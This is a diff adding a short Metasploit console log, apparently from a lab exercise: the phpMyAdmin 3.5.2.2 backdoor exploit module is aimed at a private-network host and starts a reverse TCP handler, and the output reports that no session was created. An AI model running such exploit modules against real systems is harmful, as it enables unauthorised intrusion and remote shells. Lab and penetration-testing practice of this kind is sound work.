@@ -1,0 +1,11 @@
+msf > use exploit/multi/http/phpmyadmin_3522_backdoor 
+
+msf exploit(phpmyadmin_3522_backdoor) > set RHOST 192.168.56.101
+RHOST => 192.168.56.101
+
+msf exploit(phpmyadmin_3522_backdoor) > exploit
+
+[*] Started reverse TCP handler on 192.168.56.102:4444 
+[*] Exploit completed, but no session was created.
+
+msf exploit(phpmyadmin_3522_backdoor) > back
